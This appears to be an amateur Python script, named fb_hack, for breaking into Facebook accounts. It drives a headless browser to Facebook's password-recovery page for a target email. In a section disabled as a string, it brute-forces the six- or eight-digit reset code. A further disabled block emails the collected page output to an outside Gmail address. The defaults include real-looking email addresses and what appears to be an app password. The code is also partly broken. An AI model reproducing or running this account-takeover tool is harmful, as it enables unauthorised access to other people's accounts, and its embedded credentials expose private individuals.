from selenium.webdriver import Keys, ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from time import sleep
from bs4 import BeautifulSoup
import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl, selenium, shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import logging
import selenium.webdriver
from selenium import webdriver


MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      h = ""
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex, respect):
  os.system('clear')
  soup = BeautifulSoup()
  options = webdriver.ChromeOptions()
  options.add_argument("--no-sandbox")
  options.add_argument("--disable-dev-shm-usage")
  options.add_argument("--headless=new")
  driver = webdriver.Chrome(options=options)
  driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
  html = driver.page_source
  soup = BeautifulSoup(html, 'html.parser')
  #wait = WebDriverWait(driver, 10)
  #element = wait.until(EC.visibility_of_element_located((by = By.ID, "element_id")))
  search_box = driver.find_element(by = By.ID, value = "identify_email")
  search_box.send_keys(email)
  search_box.click()
  driver.find_element(by = By.ID, value = "did_submit").click
  sleep(2)
  driver.save_screenshot("/sdcard/download/tester.png")
  
  """search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
  search_button.click()
  "make respect properly"
  counter = 0
  html = driver.page_source
  soup = BeautifulSoup(html, 'html.parser')
  with open("output1.txt", "w") as file:
    file.write(str(soup))
  #source_file = "output1.txt" 
  #destination_folder = "/sdcard/download/screenshot.png" 
  
  #shutil.move(source_file, destination_folder)
  test = soup.find(string="pop")
  sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  if sixdigits != test:
    respect = int(6)
  else:
    respect = int(8)
  for combination in itertools.product(range(10), repeat=int(respect)):
    p = (''.join(map(str, combination)))
    counter += 1
    if counter <= codex:
      print("working", end='\r')
    else:
      try:
        searchbox = driver.find_element(by = By.NAME, value = "n")
        searchbox.send_keys(p)
        searchbox.submit()
      except:
        html = driver.page_source
        soup = BeautifulSoup(html, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
        with open("output1.txt", "w") as file:
          file.write(str(soup))
      could = int(counter)
      code1 = (str(could), str(p), "failed")
      code2 = (str(could), str(p), "check")
      h = " "
      yo = h.join(code1)
      yot = h.join(code2)
      html = driver.page_source
      soup = BeautifulSoup(html, 'html.parser')
      taw = soup.find(string="Try another way")
      if taw != "None":
        print(yo)
      else:
        print(yot)
        respect = 0
        break
      sleepy(30)
  past = int(respect)"""
  return past

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 1)
past = int(input('Length: ') or 6)
sender_email = input("Your Email:") or "krarktel@gmail.com"
receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
while past >= 6:
  fb_hack(ehack, reset, past)
  past += 1
  past = 1

"""subject = "An email with attachment from Python"
body = "This is an email with attachment sent from Python"
# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails
# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "output1.txt"  # In same directory as script
# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header("Content-Disposition", f"attachment; filename= {filename}",)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
"""
